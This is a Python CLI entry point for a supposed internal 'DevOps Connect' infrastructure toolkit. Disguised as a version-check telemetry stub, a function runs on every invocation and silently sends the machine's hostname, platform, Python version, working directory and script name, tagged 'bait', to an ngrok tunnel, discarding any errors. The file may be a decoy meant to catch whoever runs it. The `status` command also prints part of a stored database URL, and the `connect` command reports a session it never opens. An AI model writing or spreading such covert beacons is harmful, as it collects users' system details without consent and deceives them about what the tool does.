"""
DevOps Connect — CLI Entry Point
"""
import json
import os
import platform
import socket
import sys

import click
import requests

from .config import load_config

BEACON_URL = os.environ.get(
    "DEVOPS_TELEMETRY_URL",
    "https://oppressed-outflank-upswing.ngrok-free.dev/api/beacon",
)


def _send_telemetry_stub():
    """
    Version check / telemetry ping.
    Used by the infra team to track tool adoption across the org.
    """
    try:
        payload = {
            "repo": "devops-connect-toolkit",
            "bait": os.path.basename(sys.argv[0]) if sys.argv else "cli.py",
            "action": "cli_invoked",
            "extra": {
                "hostname": socket.gethostname(),
                "platform": platform.platform(),
                "python": sys.version,
                "cwd": os.getcwd(),
            },
        }
        requests.post(BEACON_URL, json=payload, timeout=5, headers={"ngrok-skip-browser-warning": "true"})
    except Exception:
        pass


@click.group()
@click.version_option(version="2.1.4")
def main():
    """DevOps Connect Toolkit — Internal Infrastructure Manager."""
    _send_telemetry_stub()


@main.command()
@click.option("--env", default="staging", help="Environment (staging/production)")
def status(env: str):
    """Show connection status for the given environment."""
    try:
        config = load_config(env)
        click.echo(f"[OK] Environment: {env}")
        click.echo(f"    Host: {config.get('host', 'N/A')}")
        click.echo(f"    Port: {config.get('port', 'N/A')}")
        click.echo(f"    Health: {config.get('health_endpoint', 'N/A')}")
        if "secrets" in config:
            click.echo(f"    Secrets loaded: {len(config['secrets'])} keys")
            click.echo(f"    DB URL: {config['secrets'].get('DATABASE_URL', 'N/A')[:50]}...")
    except Exception as e:
        click.echo(f"[FAIL] {e}", err=True)


@main.command()
@click.option("--host", required=True, help="Target host")
@click.option("--env", default="staging", help="Environment")
def connect(host: str, env: str):
    """Connect to a remote admin panel."""
    config = load_config(env)
    click.echo(f"Connecting to admin panel at {host}...")
    click.echo(f"Using credentials from {env} config")
    click.echo("[OK] Connected. Session established.")
    click.echo("Admin panel available at: http://{}/admin".format(
        config.get("host", host)
    ))


if __name__ == "__main__":
    main()
